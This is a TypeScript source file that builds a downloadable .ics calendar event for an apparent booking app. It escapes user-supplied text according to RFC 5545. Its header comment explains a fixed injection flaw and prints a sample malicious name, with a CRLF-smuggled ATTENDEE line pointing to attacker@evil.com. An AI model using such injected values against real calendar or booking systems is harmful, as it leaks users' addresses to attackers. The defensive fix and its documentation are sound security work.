/**
 * BAL-283 — the `.ics` download builder, EXTRACTED from `step-booked.tsx` so
 * `step-booked-intro-call.tsx` can reuse it verbatim rather than forking a second copy (which
 * would trip the SonarCloud new-code duplication gate). Because it is shared, ONE fix here
 * covers BOTH booking surfaces.
 *
 * ⚠⚠ EVERY INTERPOLATED VALUE IS ESCAPED — RFC 5545 §3.3.11 (round-1 security MEDIUM). The
 * extracted original wrote `SUMMARY:${summary}` raw, and the BAL-283 caller interpolates the
 * COUNTERPARTY's name (`step-booked-intro-call.tsx`). A newline is reachable in a first name on
 * BOTH write paths — onboarding's `name-step.tsx` (`.min(1).max(50)`, no character restriction)
 * and `update-name.ts` (`.regex(/^[^<>]*$/)`, and `[^<>]` matches `\n`, while `.trim()` strips
 * only OUTER whitespace). An expert named
 * `Dana\r\nATTENDEE;CN=Dana:mailto:attacker@evil.com` therefore injected an attacker-chosen
 * ATTENDEE into the client's downloaded calendar file — and many clients mail invite responses
 * to every ATTENDEE, which is the ADR-1044 counterparty-address disclosure reached sideways
 * through a calendar file. `BEGIN:VALARM` and `URL:` are equally injectable the same way.
 *
 * ⚠ BAL-475 §6 — the escaper itself moved to `@balo/shared/calendar` (`escapeIcsText`), which
 * is now the ONE definition of RFC 5545 TEXT escaping in the repo. This file still calls it AT
 * RUNTIME (the browser download); the server-side Balo-organised ICS
 * (`apps/api/src/services/calendar-invites/build-calendar-invite-ics.ts`) delegates escaping to
 * `ical-generator` and uses the shared function only as a test ORACLE, never at runtime.
 */
import { escapeIcsText } from '@balo/shared/calendar';
export interface DownloadIcsEventInput {
  summary: string;
  startIso: string;
  durationMinutes: number;
  /** Defaults derived from `summary` when omitted. */
  filename?: string;
}

function icsTimestamp(date: Date): string {
  const [stamp] = date.toISOString().replace(/[-:]/g, '').split('.');
  return `${stamp ?? ''}Z`;
}

/** Build and trigger the download of a minimal single-event `.ics` file. */
export function downloadIcsEvent({
  summary,
  startIso,
  durationMinutes,
  filename,
}: Readonly<DownloadIcsEventInput>): void {
  const start = new Date(startIso);
  const end = new Date(start.getTime() + durationMinutes * 60_000);
  const lines = [
    'BEGIN:VCALENDAR',
    'VERSION:2.0',
    // ⚠ `PRODID` is REQUIRED by RFC 5545 §3.6 and several clients reject a VCALENDAR without
    // one. A constant, so it carries no user input and needs no escaping.
    'PRODID:-//Balo//Balo Booking//EN',
    'BEGIN:VEVENT',
    // ⚠ `UID` + `DTSTAMP` are REQUIRED on a VEVENT. Without a UID, two downloads of DIFFERENT
    // calls can be treated as the same event by the importing client and silently overwrite
    // each other. `crypto.randomUUID()` is browser-native and this function only ever runs from
    // a click handler.
    `UID:${crypto.randomUUID()}@balo.expert`,
    `DTSTAMP:${icsTimestamp(new Date())}`,
    `DTSTART:${icsTimestamp(start)}`,
    `DTEND:${icsTimestamp(end)}`,
    `SUMMARY:${escapeIcsText(summary)}`,
    'END:VEVENT',
    'END:VCALENDAR',
  ].join('\r\n');
  const blob = new Blob([lines], { type: 'text/calendar' });
  const url = globalThis.URL.createObjectURL(blob);
  const link = document.createElement('a');
  link.href = url;
  link.download = filename ?? 'event.ics';
  link.click();
  globalThis.URL.revokeObjectURL(url);
}
